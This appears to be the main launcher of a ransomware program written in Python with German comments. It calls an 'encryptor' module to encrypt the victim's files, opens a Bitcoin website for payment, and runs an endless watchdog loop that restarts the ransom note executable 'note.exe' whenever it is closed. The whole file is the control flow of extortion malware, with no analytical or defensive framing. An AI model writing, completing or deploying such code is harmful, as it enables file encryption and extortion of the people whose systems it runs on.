import encryptor
import webbrowser
import time
import os
import sys
import psutil
import subprocess
from config import Config

def is_process_running(process_name):
    """Prüft, ob ein Prozess mit dem gegebenen Namen läuft."""
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def start_process(exe_path):
    """Startet den Prozess über den gegebenen Pfad."""
    try:
        subprocess.Popen(exe_path)
        print(f"{exe_path} wurde gestartet.")
    except Exception as e:
        print(f"Fehler beim Starten von {exe_path}: {e}")

def monitor_and_start(process_name, exe_path, check_interval=5):
    """Überwacht den Prozess und startet ihn bei Bedarf neu."""
    while True:
        if not is_process_running(process_name):
            print(f"{process_name} läuft nicht. Starte...")
            start_process(exe_path)
        time.sleep(check_interval)

def main():
    try:
        # Schritt 1: Verschlüsselung der Dateien starten
        try:
            print("[INFO] Starte Dateiverschlüsselung...")
            encryptor.encrypt_files()
        except AttributeError:
            print("[ERROR] Die Funktion 'encrypt_files()' existiert nicht im encryptor-Modul.")
            return
        except ImportError:
            print("[ERROR] Das encryptor-Modul konnte nicht importiert werden.")
            return
        except Exception as e:
            print(f"[ERROR] Fehler bei der Verschlüsselung: {e}")
            return
        
        # Schritt 2: Bitcoin-Website öffnen
        try:
            print("[INFO] Öffne Bitcoin-Website für Zahlungsinformationen...")
            webbrowser.open(Config.BITCOIN_URL if hasattr(Config, 'BITCOIN_URL') else 'https://www.bitcoin.com')
        except Exception as e:
            print(f"[WARN] Fehler beim Öffnen der Website: {e}")
        
        # Schritt 3: Überwache und starte 'note.exe' (Ransomnote) bei Bedarf
        process_name = getattr(Config, 'NOTE_PROCESS_NAME', 'note.exe')
        exe_path = getattr(Config, 'NOTE_EXE_PATH', r'note.exe')
        print(f"[INFO] Überwache {process_name} und starte bei Bedarf.")
        monitor_and_start(process_name, exe_path)

    except KeyboardInterrupt:
        print("\n[INFO] Programm wurde durch Benutzer unterbrochen.")
        sys.exit(1)
    except Exception as e:
        print(f"[CRITICAL] Ein unerwarteter Fehler ist aufgetreten: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()